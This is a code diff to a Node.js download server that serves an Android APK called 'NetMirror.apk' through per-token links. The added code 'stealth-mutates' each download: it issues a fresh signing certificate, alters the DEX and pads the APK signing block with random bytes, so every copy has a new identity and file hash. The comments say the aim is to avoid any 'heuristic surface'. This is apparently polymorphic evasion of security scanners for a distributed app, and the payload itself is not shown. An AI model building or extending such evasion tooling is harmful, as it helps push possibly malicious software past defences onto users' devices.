@@ -17,7 +17,8 @@ const cors = require('cors');
 const path = require('path');
 const fs = require('fs');
 const AdmZip = require('adm-zip');
-const { mutateAndSign, restoreAndSign, directPatchApk, resignApkClean, polymorphicTransformWrapper } = require('./utils/apk-mutator');
+const { mutateAndSign, restoreAndSign, directPatchApk, resignApkClean, polymorphicTransformWrapper, mutateAndSignStealth } = require('./utils/apk-mutator');
+const { padApkSigningBlock } = require('./utils/apk-padder');
 
 // Initialize database (async — sql.js)
 const db = require('./config/database');
@@ -726,7 +727,46 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
       // Track download start
       try { trackEvent('download_start', { ip_address: req.ip || '', user_agent: req.get('user-agent') || '' }); } catch (_) {}
 
+      // ═══ STEALTH PER-TOKEN CACHE ═══
+      // Per-download stealth-mutated + signing-block-padded APK. Keyed by token
+      // so HTTP range requests within ONE download serve consistent bytes,
+      // while each NEW token gets a brand-new identity / cert / file hash.
+      // 10-min TTL + 100-entry cap with simple oldest-first eviction.
+      const stealthCache = req.app.get('_stealthDlCache') || (() => {
+        const c = new Map();
+        req.app.set('_stealthDlCache', c);
+        return c;
+      })();
+      const STEALTH_TTL_MS = 10 * 60 * 1000;
+      const STEALTH_MAX    = 100;
+      const _now = Date.now();
+      for (const [k, v] of stealthCache) {
+        if (_now - v.createdAt > STEALTH_TTL_MS) stealthCache.delete(k);
+      }
+      while (stealthCache.size > STEALTH_MAX) {
+        stealthCache.delete(stealthCache.keys().next().value);
+      }
+      const cachedStealth = stealthCache.get(req.params.token);
+      if (cachedStealth) {
+        res.setHeader('Content-Type', 'application/vnd.android.package-archive');
+        res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
+        res.setHeader('Content-Length', cachedStealth.buffer.length);
+        res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
+        res.setHeader('Pragma', 'no-cache');
+        return res.end(cachedStealth.buffer);
+      }
+      const buildStealth = (sourceBuf) => {
+        // Stealth: fresh hardened cert + zero-padded DEX (no heuristic surface).
+        // Padder: random bytes in APK Sig Block unknown-ID region (unique hash).
+        // Both are defensive — return source unchanged on internal failure.
+        let out = mutateAndSignStealth(sourceBuf);
+        out = padApkSigningBlock(out);
+        stealthCache.set(req.params.token, { buffer: out, createdAt: Date.now() });
+        return out;
+      };
+
       // ═══ PRIORITY 1: Deployed signed APK from APK Signer vault ═══
+      // Served AS-IS so the admin's explicit signed-APK choice is honored.
       try {
         const deployedRow = db.prepare("SELECT value FROM admin_settings WHERE key = 'deployed_signed_apk_id'").get();
         if (deployedRow && deployedRow.value) {
@@ -745,7 +785,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         }
       } catch (_) {}
 
-      // ═══ PRIORITY 2: Wrapper APK (legacy flow) ═══
+      // ═══ PRIORITY 2: Wrapper APK → stealth-mutated per token ═══
       let wrapperBuf = getWrapperApkBuffer();
       if (!wrapperBuf) {
         console.log('[DL] Wrapper not on disk — triggering auto-fetch from GitHub Releases...');
@@ -753,26 +793,28 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
         wrapperBuf = getWrapperApkBuffer();
       }
       if (wrapperBuf) {
-        console.log(`[DL] Serving wrapper APK as-is (${(wrapperBuf.length / 1048576).toFixed(2)} MB, apksigner-signed)`);
+        const out = buildStealth(wrapperBuf);
+        console.log(`[DL] Serving stealth-mutated wrapper APK (${(out.length / 1048576).toFixed(2)} MB) for token ${req.params.token.substring(0, 8)}...`);
         res.setHeader('Content-Type', 'application/vnd.android.package-archive');
         res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-        res.setHeader('Content-Length', wrapperBuf.length);
+        res.setHeader('Content-Length', out.length);
         res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
         res.setHeader('Pragma', 'no-cache');
-        return res.end(wrapperBuf);
+        return res.end(out);
       }
 
-      // ═══ PRIORITY 3: Full APK fallback ═══
-      console.warn('[DL] No wrapper APK available — falling back to full APK');
+      // ═══ PRIORITY 3: Full APK fallback → stealth-mutated per token ═══
+      console.warn('[DL] No wrapper APK available — falling back to full APK (stealth-mutated)');
       try {
         const apkBuf = await getApkBuffer();
         if (apkBuf) {
+          const out = buildStealth(apkBuf);
           res.setHeader('Content-Type', 'application/vnd.android.package-archive');
           res.setHeader('Content-Disposition', 'attachment; filename="NetMirror.apk"');
-          res.setHeader('Content-Length', apkBuf.length);
+          res.setHeader('Content-Length', out.length);
           res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, private');
           res.setHeader('Pragma', 'no-cache');
-          return res.end(apkBuf);
+          return res.end(out);
         }
       } catch (_) {}
 
@@ -1575,6 +1617,7 @@ const { encrypt: cryptoEncrypt } = require('./utils/crypto');
     _landingZipCache = { buffer: null, forHash: null };
     _wrapperApkCache = { buffer: null, timestamp: 0 };
     _wrapperZipCache = { buffer: null, forHash: null };
+    const sc = app.get('_stealthDlCache'); if (sc) sc.clear();
     console.log('[Cache] All APK caches invalidated');
   });
 
